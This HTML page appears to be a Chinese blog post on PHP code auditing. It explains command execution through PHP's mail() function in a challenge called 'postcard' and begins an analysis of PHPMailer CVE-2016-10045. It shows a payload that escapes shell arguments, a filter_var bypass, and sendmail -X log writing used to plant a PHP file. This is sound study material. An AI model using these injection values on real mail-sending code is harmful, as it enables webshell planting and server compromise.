<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="postcard题目叫做明信片，代码如下：漏洞解析 ： 这道题其实是考察由 php 内置函数 mail 所引发的命令执行漏洞。我们先看看 php 自带的 mail 函数的用法： 1234567bool mail (	string $to ,	string $subject ,	string $message [,	string $additional_headers [,	string $addi">
<meta property="og:type" content="article">
<meta property="og:title" content="【代码审计】PHP代码审计2">
<meta property="og:url" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="postcard题目叫做明信片，代码如下：漏洞解析 ： 这道题其实是考察由 php 内置函数 mail 所引发的命令执行漏洞。我们先看看 php 自带的 mail 函数的用法： 1234567bool mail (	string $to ,	string $subject ,	string $message [,	string $additional_headers [,	string $addi">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-1.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-2.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-3.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-4.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-5.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-6.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-7.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-8.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-9.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-10.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-11.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-12.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-13.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-14.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-15.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-16.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-17.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-18.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-19.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-20.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-21.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-22.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-23.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-24.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-25.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-26.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-27.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-28.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-29.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-30.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-31.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-32.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-33.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-34.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-35.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-36.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-37.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-38.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-39.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-40.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-41.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-42.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-43.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-44.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-45.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-46.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-47.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-48.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-49.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-50.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-51.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-52.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-53.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-54.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-55.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-56.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-57.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-58.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-59.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-60.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-61.png">
<meta property="og:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-62.png">
<meta property="article:published_time" content="2024-10-10T08:54:18.000Z">
<meta property="article:modified_time" content="2024-10-14T04:45:46.952Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【代码审计】PHP代码审计2</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/10/11/WebSecurity/framwork/webarchitecture/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&text=【代码审计】PHP代码审计2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&is_video=false&description=【代码审计】PHP代码审计2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计2&body=Check out this article: https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&name=【代码审计】PHP代码审计2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/10/10/WebSecurity/codeaudit/phpaudit2/&t=【代码审计】PHP代码审计2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#postcard"><span class="toc-number">1.</span> <span class="toc-text">postcard</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045"><span class="toc-number">1.1.1.</span> <span class="toc-text">CVE-2016-10045</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">CVE-2016-10045</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98payload%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">解题payload：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forst-Pattern"><span class="toc-number">2.</span> <span class="toc-text">Forst Pattern</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">2.3.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">2.4.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bell"><span class="toc-number">3.</span> <span class="toc-text">Bell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">3.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">3.2.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">3.5.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-2"><span class="toc-number">3.6.</span> <span class="toc-text">题目</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【代码审计】PHP代码审计2
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-10T08:54:18.000Z" class="dt-published" itemprop="datePublished">2024-10-10</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="postcard"><a href="#postcard" class="headerlink" title="postcard"></a>postcard</h2><p>题目叫做明信片，代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png"><br><strong>漏洞解析</strong> ：</p>
<p>这道题其实是考察由 <strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 <strong>php</strong> 自带的 <strong>mail</strong> 函数的用法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">mail</span> (</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$to</span> ,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$subject</span> ,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$message</span> [,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$additional_headers</span> [,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$additional_parameters</span> ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>其参数含义分别表示如下：</p>
<blockquote>
<ul>
<li>to，指定邮件接收者，即接收人</li>
<li>subject，邮件的标题</li>
<li>message，邮件的正文内容</li>
<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
</ul>
</blockquote>
<p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong><a target="_blank" rel="noopener" href="http://www.sendmail.com/">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p>
<blockquote>
<ul>
<li><p>-O option &#x3D; value</p>
<p>QueueDirectory &#x3D; queuedir 选择队列消息</p>
</li>
<li><p>-X logfile</p>
<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
</li>
<li><p>-f from email</p>
<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
</li>
</ul>
</blockquote>
<p>举个简单例子方便理解: </p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-1.png"></p>
<p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;rce.php</strong> 中写入如下数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17220</span> &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; X-PHP-Originating-Script: <span class="number">0</span>:test.php</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt;</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure>

<p>当然这题如果只是这一个问题的话，会显的太简单了，我们继续往下看，在 <strong>第3行</strong> 有这样一串代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure>

<p>这串代码的主要作用，是确保在第5个参数中只使用有效的电子邮件地址 <strong>$email</strong> 。我们先了解一下 <strong>filter_var()</strong> 函数的定义：</p>
<blockquote>
<p><strong><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.filter-var.php">filter_var</a></strong> ：使用特定的过滤器过滤一个变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )</span><br></pre></td></tr></table></figure>

<p><strong>功能</strong> ：这里主要是根据第二个参数filter过滤一些想要过滤的东西。</p>
</blockquote>
<p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。 <strong>filter_var()</strong> 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，这样我们就可以绕过检测。下面举个简单的例子，方便理解：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-2.png"></p>
<p>当然由于引入的特殊符号，虽然绕过了 <strong>filter_var()</strong> 针对邮箱的检测，但是由于PHP的 <strong>mail()</strong> 函数在底层实现中，调用了 <strong>escapeshellcmd()</strong> 函数，对用户输入的邮箱地址进行检测，导致即使存在特殊符号，也会被 <strong>escapeshellcmd()</strong> 函数处理转义，这样就没办法达到命令执行的目的了。 <strong>escapeshellcmd()</strong> 函数在底层代码如下（详细点 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c">这里</a> ）：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-3.png"><br>因此我们继续往下看，在第七行有这样一串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$email</span>);</span><br></pre></td></tr></table></figure>

<p>这句代码主要是处理 <strong>$email</strong> 传入的数据。我们先来看一下 <strong>escapeshellarg</strong> 函数的定义：</p>
<blockquote>
<p><strong><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)</p>
<p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p>
</blockquote>
<p>具体功能作用，可以参考如下案例：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-4.png"><br>那我们前面说过了PHP的 <strong>mail()</strong> 函数在底层调用了 <strong>escapeshellcmd()</strong> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过 <strong>filter_var()</strong> 的检测，但还是会被 <strong>escapeshellcmd()</strong> 处理。然而 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸，下面我们给个简单例子理解一下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-5.png"></p>
<p>详细分析一下这个过程：</p>
<ol>
<li><p>传入的参数是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p>
</li>
</ol>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-6.png"></p>
<p>所以这个payload可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1&#39;</code> 。</p>
<p>总结一下，这题实际上是考察绕过 <strong>filter_var()</strong> 函数的邮件名检测，通过 <strong>mail</strong> 函数底层实现中调用的 <strong>escapeshellcmd()</strong> 函数处理字符串，再结合 <strong>escapeshellarg()</strong> 函数，最终实现参数逃逸，导致 <strong>远程代码执行</strong> 。</p>
<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>这里实例分析选择 <strong>PHPMailer 命令执行漏洞</strong> （  <strong>CVE-2016-10045</strong> 和 <strong>CVE-2016-10033</strong> ）。项目代码可以通过以下方式下载：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/PHPMailer/PHPMailer</span><br><span class="line"><span class="built_in">cd</span> PHPMailer</span><br><span class="line">git checkout -b CVE-2016-10033 v5.2.17</span><br></pre></td></tr></table></figure>
<h4 id="CVE-2016-10045"><a href="#CVE-2016-10045" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>漏洞原理</p>
<p>在github上直接diff一下，对比一下不同版本的 <strong><a target="_blank" rel="noopener" href="https://github.com/PHPMailer/PHPMailer/compare/v5.2.17...v5.2.18#diff-ace81e501931d8763b49f2410cf3094d">class.phpmailer.php</a></strong> 文件，差异如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-7.png"></p>
<p>这里在 <strong>sendmailSend</strong> 函数中加了 <strong>validateAddress</strong> 函数，来针对发送的数据进行判断，判断邮箱地址的合法性。另外针对传入的数据，调用了 <strong>escapeshellarg</strong> 函数来转义特殊符号，防止注入参数。然而这样做，就引入了我们上面讨论的问题，即同时使用 <strong>escapeshellarg</strong> 函数和 <strong>escapeshellcmd()</strong> 函数，导致单引号逃逸。由于程序没有对传命令参数的地方进行转义，所以我们可以结合 <strong>mail</strong> 函数的第五个参数 <strong>-X</strong> 写入 <strong>webshell</strong> 。</p>
<p>下面详细看一下代码，漏洞具体位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码如下 ：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-8.png"></p>
